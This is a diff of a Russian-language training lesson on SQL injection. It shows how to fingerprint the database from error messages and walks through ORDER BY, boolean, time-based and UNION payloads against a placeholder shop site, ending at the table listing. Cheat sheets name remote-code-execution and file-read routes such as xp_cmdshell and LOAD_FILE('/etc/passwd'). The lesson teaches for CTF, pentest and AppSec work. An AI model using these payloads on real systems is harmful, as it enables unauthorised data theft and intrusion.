@@ -15,174 +15,201 @@ estimated_minutes: 30
 summary: "Как определить СУБД по отклику и выбрать правильный диалект атаки: сводная карта синтаксиса и навигация к детальному разбору MySQL, PostgreSQL, MSSQL, Oracle и SQLite."
 ---
 
-Один и тот же «SQL-инъекционный» класс на практике распадается на пять совершенно разных миров. `SLEEP(5)` в MySQL — это `pg_sleep(5)` в PostgreSQL, `WAITFOR DELAY` в MSSQL, `dbms_pipe.receive_message` в Oracle и вообще отсутствие задержек в SQLite. `GROUP_CONCAT` есть только в MySQL, `string_agg` — в PostgreSQL и MSSQL, `LISTAGG` — в Oracle. RCE достижим через `xp_cmdshell` (MSSQL), `COPY ... TO PROGRAM` (PostgreSQL), `lib_mysqludf_sys` (MySQL), `dbms_java` (Oracle) — и почти невозможен в SQLite. Этот урок — карта: как понять, с какой базой вы говорите, и куда идти за деталями. Пять следующих уроков — полные практические разборы каждой СУБД.
+## Вопрос, с которого всё начинается
 
-## Зачем отдельный урок под каждую СУБД
+Ты нашёл SQL-инъекцию в параметре `id`. Ты вставляешь привычный `' OR 1=1-- -` — и ничего. Меняешь кавычку, пробуешь `SLEEP(5)` — ответ мгновенный. Что не так?
 
-Большинство «туториалов по SQLi» написаны под MySQL и молча ломаются на всём остальном. На реальном тесте вы не выбираете базу — вы её обнаруживаете. Разница критична, потому что от неё зависит:
+Проблема в том, что «SQL» — это не один язык. MySQL, PostgreSQL, MSSQL, Oracle и SQLite — пять **разных диалектов**. `SLEEP(5)` существует только в MySQL; в PostgreSQL это `pg_sleep(5)`, в MSSQL — `WAITFOR DELAY`, в Oracle — `dbms_pipe.receive_message`, а в SQLite задержек нет вообще. Payload под MySQL на другой базе просто выдаст ошибку.
 
-- **какая техника сработает** (blind по времени есть везде, но функции разные);
-- **какие данные можно достать** (`information_schema` есть не везде одинаково; в Oracle это `all_tables`, в SQLite — `sqlite_master`);
-- **дойдёте ли вы до RCE** (MSSQL/PostgreSQL — да, SQLite — почти нет);
-- **как обходить WAF** (комментарии, конкатенация, ключевые слова — всё разное).
+Значит, прежде чем атаковать, надо понять: **с какой базой мы говорим**. Этим и займёмся на одном живом параметре.
 
-Практическое правило: **сначала фингерпринт, потом диалект**. Не пишите payload «в общем виде» — определите базу и переходите к её уроку.
+## Наш пример
 
-## Фингерпринт: как понять, какая это база
+Есть магазин `shop.example`. Каталог товаров отдаётся по `GET /product?id=1`:
 
-Первый шаг — намеренно сломать запрос и прочитать текст ошибки. Синтаксические ошибки у каждой СУБД уникальны.
+```bash
+$ curl -s 'https://shop.example/product?id=1'
+[[1,"Laptop",999.0]]
+```
 
-| Признак в ответе / поведении | Вероятная СУБД |
-|------------------------------|----------------|
+Сервер вернул JSON-массив с товаром. Параметр `id` явно уходит в запрос к базе. Проверим, склеен ли он со строкой запроса — добавим одну кавычку:
+
+```bash
+$ curl -s 'https://shop.example/product?id=1%27'
+SQL error: unrecognized token: "'"
+```
+
+Ошибка. Это первая улика: запрос сломан, значит, инъекция есть. Но текст ошибки — это ещё и **отпечаток** базы. `unrecognized token` — характерная формулировка SQLite.
+
+## Шаг 1: фингерпринт по тексту ошибки
+
+Каждая СУБД ругается по-своему. Сверим наш ответ с картой:
+
+| Признак в ответе | Вероятная СУБД |
+|------------------|----------------|
 | `You have an error in your SQL syntax` | MySQL / MariaDB |
-| `syntax error at or near "..."` / `ERROR: unterminated quoted string` | PostgreSQL |
-| `Unclosed quotation mark after the character string` / `Microsoft OLE DB Provider for SQL Server` / `Incorrect syntax near` | MSSQL |
-| `ORA-00933: SQL command not properly ended` / `ORA-01756` | Oracle |
-| `SQLite3::SQLException` / `near "..." : syntax error` / `no such table` | SQLite |
-| `Unknown column '...' in 'where clause'` | MySQL |
-| `column "..." does not exist` | PostgreSQL |
-| `Invalid column name '...'` | MSSQL |
-| `no such column: ...` | SQLite |
+| `syntax error at or near "..."` | PostgreSQL |
+| `Unclosed quotation mark after the character string` / `Incorrect syntax near` | MSSQL |
+| `ORA-00933: SQL command not properly ended` | Oracle |
+| `unrecognized token` / `near "...": syntax error` / `no such table` | SQLite |
 
-Дальше уточняем версию через функцию версии — но она тоже у каждой своя:
+Наш `unrecognized token` — SQLite. Один запрос дал нам диалект. Теперь можно уточнить версию — но и функция версии у каждой базы своя:
 
 | СУБД | Запрос версии |
 |------|---------------|
-| MySQL | `SELECT @@version`, `SELECT version()` |
-| PostgreSQL | `SELECT version()`, `SHOW server_version` |
-| MSSQL | `SELECT @@version`, `SELECT SERVERPROPERTY('ProductVersion')` |
-| Oracle | `SELECT banner FROM v$version`, `SELECT version FROM v$instance` |
+| MySQL | `SELECT @@version` |
+| PostgreSQL | `SELECT version()` |
+| MSSQL | `SELECT @@version` |
+| Oracle | `SELECT banner FROM v$version` |
 | SQLite | `SELECT sqlite_version()` |
 
-## Сводная таблица диалектов
+## Шаг 2: считаем колонки через ORDER BY
 
-Держите её перед глазами при ручной инъекции. Это самый полезный «шпаргалочный» блок урока.
+Почти в любой базе работает `ORDER BY N`: если колонки с номером `N` нет, запрос падает. Перебираем `N` и смотрим, на каком значении ответ сломается:
+
+```bash
+$ for n in 1 2 3 4; do
+>   printf '%s -> ' "$n"
+>   curl -s "https://shop.example/product?id=1 ORDER BY $n" | head -c 30; echo
+> done
+1 -> [[1,"Laptop",999.0]]
+2 -> [[1,"Laptop",999.0]]
+3 -> [[1,"Laptop",999.0]]
+4 -> SQL error: 1st ORDER BY term out of range
+```
+
+На `4` запрос упал — значит, в запросе **три колонки**. Это критично для UNION-инъекции: количество колонок в `UNION SELECT` должно совпадать.
+
+## Шаг 3: проверяем boolean-различие
+
+Прежде чем строить UNION, убедимся, что можем влиять на логику. Сравним два запроса — «истина» и «ложь»:
+
+```bash
+$ curl -s 'https://shop.example/product?id=1 AND 1=1'
+[[1,"Laptop",999.0]]
+$ curl -s 'https://shop.example/product?id=1 AND 1=2'
+[]
+```
+
+`AND 1=1` вернул товар, `AND 1=2` — пустоту. Это **boolean-blind**: приложение честно отражает, истинно ли наше условие. Дальше можно задавать любые вопросы к базе.
+
+## Шаг 4: time-blind — и как понять, что его нет
+
+Если ответы выглядят одинаково, инъекцию находят по **времени**. Но функция задержки у каждой базы своя, и в SQLite её нет. Проверим MySQL-вариант:
+
+```bash
+$ time curl -s -o /dev/null 'https://shop.example/product?id=1; SELECT SLEEP(5)'
+real    0m0.084s
+```
+
+Мгновенно. Либо `SLEEP` не сработал, либо это не MySQL. Наша ошибка уже сказала «SQLite» — а там задержек нет, поэтому time-blind отпадает, и мы работаем через UNION/boolean. Так фингерпринт экономит целый класс попыток.
+
+## Шаг 5: UNION и вывод данных
+
+Раз колонок три, соберём UNION-запрос и посмотрим, какие колонки отражаются в ответе:
+
+```bash
+$ curl -s "https://shop.example/product?id=-1 UNION SELECT 1,'X',3"
+[[1,"X",3]]
+```
+
+Вторая колонка печатается. Теперь в неё можно положить данные из системного каталога. У каждой базы каталог называется по-разному: в MySQL/PostgreSQL это `information_schema.tables`, в Oracle — `all_tables`, в MSSQL — `sys.objects`, а в SQLite — `sqlite_master`.
+
+```bash
+$ curl -s "https://shop.example/product?id=-1 UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table'"
+[[1,"products",3]]
+[[1,"users",3]]
+```
+
+Таблица `users` — наша следующая цель. С этого места начинается уже детальный разбор SQLite (урок `db-sqlite`).
+
+## Сводная карта диалектов
+
+Держи перед глазами при ручной инъекции:
 
 | Возможность | MySQL | PostgreSQL | MSSQL | Oracle | SQLite |
 |-------------|-------|------------|-------|--------|--------|
-| Комментарий строки | `-- ` , `#`, `/* */` | `-- `, `/* */` | `-- `, `/* */` | `-- `, `/* */` | `-- `, `/* */` |
-| Конкатенация | `CONCAT(a,b)`, `a b` | `a || b`, `CONCAT` | `a + b`, `CONCAT` | `a || b`, `CONCAT` | `a || b` |
-| Агрегация строк | `GROUP_CONCAT(x)` | `string_agg(x,',')` | `STRING_AGG(x,',')` | `LISTAGG(x,',')` | `GROUP_CONCAT(x)` |
-| Текущая БД | `database()`, `schema()` | `current_database()` | `DB_NAME()` | `SYS_CONTEXT('USERENV','DB_NAME')` | `sqlite_master` (файл) |
-| Пользователь | `user()`, `current_user()` | `current_user` | `SUSER_SNAME()`, `USER_NAME()` | `USER` | нет ролей |
-| Пауза | `SLEEP(5)` | `pg_sleep(5)` | `WAITFOR DELAY '0:0:5'` | `dbms_pipe.receive_message('a',5)` | нет |
-| Ограничение строк | `LIMIT 1 OFFSET 0` | `LIMIT 1 OFFSET 0` | `TOP 1`, `OFFSET` | `ROWNUM`, `FETCH FIRST` | `LIMIT 1 OFFSET 0` |
-| Stacked (`;`) | зависит от драйвера | да (libpq) | да | нет (PL/SQL) | обычно нет |
-| Чтение файла | `LOAD_FILE('/etc/passwd')` | `pg_read_file()` | `OPENROWSET(BULK ...)` | `UTL_FILE` | нет |
-| Запись файла | `INTO OUTFILE` | `COPY ... TO` | `OLE Automation`, `BCP` | `UTL_FILE` | `ATTACH DATABASE` |
+| Комментарий | `-- `, `#`, `/* */` | `-- `, `/* */` | `-- `, `/* */` | `-- `, `/* */` | `-- `, `/* */` |
+| Конкатенация | `CONCAT(a,b)` | `a || b` | `a + b` | `a || b` | `a || b` |
+| Агрегация строк | `GROUP_CONCAT` | `string_agg` | `STRING_AGG` | `LISTAGG` | `GROUP_CONCAT` |
+| Пауза | `SLEEP(5)` | `pg_sleep(5)` | `WAITFOR DELAY '0:0:5'` | `dbms_pipe.receive_message` | нет |
+| Каталог | `information_schema` | `information_schema` | `sys.objects` | `all_tables` | `sqlite_master` |
 | RCE | UDF `lib_mysqludf_sys` | `COPY ... FROM PROGRAM` | `xp_cmdshell` | Java stored procs | `load_extension` |
 
-## Каналы утечки: что работает в каждой базе
+Каналы утечки: **UNION** и **boolean-blind** есть везде; **error-based** — у всех, кроме SQLite; **time-blind** — у четырёх из пяти; **OOB** (внешние DNS/HTTP-запросы) — у MySQL/PostgreSQL/MSSQL/Oracle, но не у SQLite.
 
-| Канал | MySQL | PostgreSQL | MSSQL | Oracle | SQLite |
-|-------|:-----:|:----------:|:-----:|:------:|:------:|
-| UNION (in-band) | да | да | да | да | да |
-| Error-based | да (`extractvalue`) | да (`CAST`) | да (`CONVERT`) | да (`CTXSYS.DRITHSX`) | редко |
-| Boolean-blind | да | да | да | да | да |
-| Time-blind | `SLEEP` | `pg_sleep` | `WAITFOR` | `dbms_pipe` | нет |
-| OOB DNS/HTTP | `LOAD_FILE` (Windows UNC) | `COPY`, `dblink` | `xp_dirtree` | `UTL_HTTP`/`UTL_INADDR` | нет |
+## Что мы теперь знаем
 
-Ключевой вывод: **blind по времени есть у четырёх из пяти** — поэтому его и стоит осваивать первым. SQLite-инъекции обычно эксплуатируют через UNION или boolean, потому что задержек там нет.
+- **Сначала фингерпринт, потом payload.** Одна кавычка → текст ошибки → диалект.
+- **`ORDER BY N`** находит число колонок почти в любой базе.
+- **`AND 1=1` vs `AND 1=2`** даёт boolean-сигнал даже без вывода.
+- **Функция задержки зависит от базы**, а в SQLite её нет — не трать время.
+- **Каталог метаданных называется по-разному:** `information_schema`, `all_tables`, `sys.objects`, `sqlite_master`.
+- **RCE есть не везде:** проще всего в MSSQL и PostgreSQL, почти невозможно в SQLite.
 
-## Универсальный алгоритм: с чего начинать на любой БД
+## На что смотреть дальше
 
-Порядок действий, который не зависит от диалекта (детали — в уроках по базам):
-
-```bash
-# 1. Разорвать кавычку и прочитать ошибку -> определить СУБД
-curl -s "https://target/item?id=1'" | grep -iE "syntax|ORA-|SQL Server|SQLite|PostgreSQL"
-
-# 2. Число колонок через ORDER BY (работает почти везде)
-for n in 1 2 3 4 5; do
-  echo -n "$n: "
-  curl -s "https://target/item?id=1 ORDER BY $n-- -" | wc -c
-done
-
-# 3. Проверить boolean-различие (норма vs ложь)
-curl -s "https://target/item?id=1 AND 1=1-- -" | wc -c   # как обычный
-curl -s "https://target/item?id=1 AND 1=2-- -" | wc -c   # отличается -> инъекция
-
-# 4. Проверить time-blind своей для базы функцией (5 сек)
-curl -s -o /dev/null -w '%{time_total}\n' "https://target/item?id=1; SELECT SLEEP(5)-- -"   # MySQL
-curl -s -o /dev/null -w '%{time_total}\n' "https://target/item?id=1; SELECT pg_sleep(5)-- -" # PostgreSQL
-
-# 5. UNION и вывод колонок
-curl -s "https://target/item?id=-1 UNION SELECT 1,2,3-- -"
-```
-
-Как только СУБД определена — открывайте соответствующий урок ниже и работайте по нему. Не смешивайте синтаксис: `SLEEP` в PostgreSQL даст ошибку функции, `pg_sleep` в MySQL — тоже.
-
-## Переход к разборам: пять баз
-
-| Урок | База | Ключевые фишки | RCE |
-|------|------|----------------|:---:|
-| [`db-mysql`](db-mysql) | MySQL / MariaDB | `GROUP_CONCAT`, `INTO OUTFILE`, UDF, `general_log` | да |
-| [`db-postgresql`](db-postgresql) | PostgreSQL | `string_agg`, `COPY TO/FROM PROGRAM`, `pg_read_file` | да |
-| [`db-mssql`](db-mssql) | Microsoft SQL Server | `xp_cmdshell`, `OPENROWSET`, linked servers | да |
-| [`db-oracle`](db-oracle) | Oracle | `all_tables`, `UTL_HTTP`, PL/SQL, Java procs | через Java |
-| [`db-sqlite`](db-sqlite) | SQLite | `sqlite_master`, `ATTACH DATABASE`, mobile apps | `load_extension` |
-
-Начинайте с той базы, которую показал фингерпринт. Если не удалось определить — работайте по MySQL-диалекту (самый частый в вебе), но помните про `information_schema`, который есть у большинства.
-
-## Типичные ошибки при смене СУБД
-
-- **Слепо использовать MySQL-синтаксис.** `--` без пробела не работает в MySQL, `#` не работает в PostgreSQL/MSSQL/Oracle.
-- **Забывать про регистр в Oracle.** Некавычечные идентификаторы в Oracle — ВЕРХНИЙ регистр: `all_tables` вернёт строки, а `ALL_TABLES` в кавычках — нет.
-- **Ждать stacked-запросов везде.** В Oracle и часто в SQLite они невозможны; планируйте UNION/blind.
-- **Путать `information_schema` и системные каталоги.** В Oracle нет `information_schema` в привычном виде — там `all_tables`, `all_tab_columns`.
-- **Искать time-based там, где его нет.** В SQLite `SLEEP` не существует; переходите на UNION/boolean.
-- **Забывать про `--secure-file-priv`.** В MySQL файловые функции и `INTO OUTFILE` могут быть заблокированы настройкой.
+- **Не смешивай диалекты.** `SLEEP` в PostgreSQL — ошибка функции; `#`-комментарий не работает вне MySQL.
+- **`--` требует пробела в MySQL** (`-- `, а не `--`), иначе запрос не закомментируется.
+- **Oracle регистрозависим:** неквотированные идентификаторы — в верхнем регистре (`ALL_TABLES`).
+- **Stacked-запросы (`;`) есть не везде:** в Oracle и часто в SQLite их нет — планируй UNION/blind.
+- **MySQL может блокировать файлы** настройкой `--secure-file-priv` — проверяй, прежде чем рассчитывать на `INTO OUTFILE`.
+- **Определил базу — иди в её урок.** Детали MySQL, PostgreSQL, MSSQL, Oracle и SQLite разобраны отдельно.
 
 ## Квиз
 
-Выберите один вариант в каждом вопросе.
+Проверь себя.
 
 ```quiz
-- question: "Ошибка «You have an error in your SQL syntax» указывает на какую СУБД?"
+- question: 'Ответ `SQL error: unrecognized token` указывает на какую СУБД?'
   options:
     - "PostgreSQL"
     - "MySQL"
     - "MSSQL"
-    - "Oracle"
-  answer: 1
-  explanation: "Это классический текст ошибки MySQL/MariaDB."
-- question: "Какая функция агрегирует строки в одну строку в MySQL?"
+    - "SQLite"
+  answer: 3
+  explanation: "Формулировка «unrecognized token» — характерный отпечаток SQLite."
+- question: "Зачем перебирать `ORDER BY N`?"
   options:
+    - "Чтобы ускорить запрос"
+    - "Чтобы узнать число колонок в запросе — нужно для UNION"
+    - "Чтобы включить отладку"
+    - "Чтобы обойти WAF"
+  answer: 1
+  explanation: "Когда N превышает число колонок, запрос падает — так находится их количество."
+- question: "Какая функция агрегирует строки в PostgreSQL?"
+  options:
+    - "GROUP_CONCAT"
     - "string_agg"
     - "LISTAGG"
-    - "GROUP_CONCAT"
-    - "STRING_AGG"
-  answer: 2
-  explanation: "GROUP_CONCAT — MySQL. string_agg — PostgreSQL, LISTAGG — Oracle."
-- question: "Как организовать задержку (time-based blind) в MSSQL?"
+    - "STRING_JOIN"
+  answer: 1
+  explanation: "В PostgreSQL это string_agg; GROUP_CONCAT — MySQL, LISTAGG — Oracle."
+- question: "Как организовать time-blind в MSSQL?"
   options:
     - "SLEEP(5)"
     - "pg_sleep(5)"
     - "WAITFOR DELAY '0:0:5'"
-    - "dbms_pipe.receive_message('a',5)"
+    - "dbms_pipe.receive_message"
   answer: 2
   explanation: "В MSSQL пауза делается через WAITFOR DELAY."
-- question: "В какой СУБД RCE достигается через COPY ... FROM PROGRAM?"
-  options:
-    - "SQLite"
-    - "PostgreSQL"
-    - "Oracle"
-    - "MySQL"
-  answer: 1
-  explanation: "COPY TO/FROM PROGRAM — серверная фича PostgreSQL, доступная суперпользователю."
-- question: "Где хранится список таблиц в SQLite?"
+- question: "Где в SQLite лежит список таблиц?"
   options:
     - "information_schema.tables"
     - "all_tables"
     - "sys.objects"
     - "sqlite_master"
   answer: 3
-  explanation: "В SQLite метаданные лежат в sqlite_master (и sqlite_schema)."
+  explanation: "Метаданные SQLite хранятся в sqlite_master (он же sqlite_schema)."
 ```
+
+## Куда дальше
+
+Определив базу, ты переходишь в урок по конкретной СУБД — начинай с той, что показал фингерпринт (`db-sqlite`, `db-mysql`, `db-postgresql`, `db-mssql`, `db-oracle`). А если хочешь автоматизировать весь этот путь, следующий урок (`web-tool-sqlmap`) показывает, как `sqlmap` делает фингерпринт, находит колонки и дампит таблицу одной командой. А пока главное запомни: **диалект определяет payload** — сначала узнай базу, потом атакуй.
 
 ## Где пригодится
 
-- **CTF (Web):** задачи с разными СУБД — частая тема; умение определить диалект экономит десятки минут.
+- **CTF (Web):** разные СУБД — частая тема; быстрый фингерпринт экономит десятки минут.
 - **Bug bounty:** реальные приложения используют MySQL, PostgreSQL, MSSQL, Oracle; payload под правильную базу = подтверждённый high/critical.
 - **Пентест:** отчёт требует точной идентификации СУБД и рабочего PoC под неё.
 - **Работа (AppSec):** ревью кода и конфигураций под конкретный движок; понимание, где возможен RCE через базу.
